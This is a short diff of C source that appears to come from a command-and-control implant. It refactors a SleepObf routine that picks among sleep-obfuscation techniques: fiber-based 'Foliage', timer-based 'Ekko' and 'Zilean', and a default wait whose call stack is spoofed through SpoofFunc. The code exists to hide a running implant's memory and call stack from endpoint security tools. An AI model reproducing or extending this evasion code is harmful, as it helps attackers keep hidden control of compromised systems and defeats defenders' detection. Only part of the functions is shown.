             SLEEP_PARAM Param = { 0 };
 
-            if ( ( Param.Master = Instance.Win32.ConvertThreadToFiberEx( &Param, 0 ) ) )
-            {
-                if ( ( Param.Slave = Instance.Win32.CreateFiberEx( 0x1000 * 6, 0, 0, C_PTR( FoliageObf ), &Param ) ) )
-                {
+            if ( ( Param.Master = Instance.Win32.ConvertThreadToFiberEx( &Param, 0 ) ) ) {
+                if ( ( Param.Slave = Instance.Win32.CreateFiberEx( 0x1000 * 6, 0, 0, C_PTR( FoliageObf ), &Param ) ) ) {
                     Param.TimeOut = TimeOut;
                     Instance.Win32.SwitchToFiber( Param.Slave );
                     Instance.Win32.DeleteFiber( Param.Slave );
@@ -549,19 +711,25 @@ VOID SleepObf(
             break;
         }
 
-        case 2: // Ekko
-        {
-            EkkoObf( TimeOut );
+        /* timer api based sleep obfuscation */
+        case SLEEPOBF_EKKO:
+        case SLEEPOBF_ZILEAN: {
+            if ( ! TimerObf( TimeOut, Technique ) ) {
+                goto DEFAULT;
+            }
             break;
         }
 
-        default:
-        {
-            /*
-             * Also check out RegisterWaitForSingleObjectEx
-             */
-
-            SpoofFunc( Instance.Win32.WaitForSingleObjectEx, Instance.Modules.KernelBase, IMAGE_SIZE( Instance.Modules.KernelBase ), NtCurrentProcess(), TimeOut, FALSE );
+        /* default */
+        DEFAULT: case SLEEPOBF_NO_OBF: {}; default: {
+            SpoofFunc(
+                Instance.Modules.KernelBase,
+                IMAGE_SIZE( Instance.Modules.KernelBase ),
+                Instance.Win32.WaitForSingleObjectEx,
+                NtCurrentProcess(),
+                C_PTR( TimeOut ),
+                FALSE
+            );
         }
     }
 
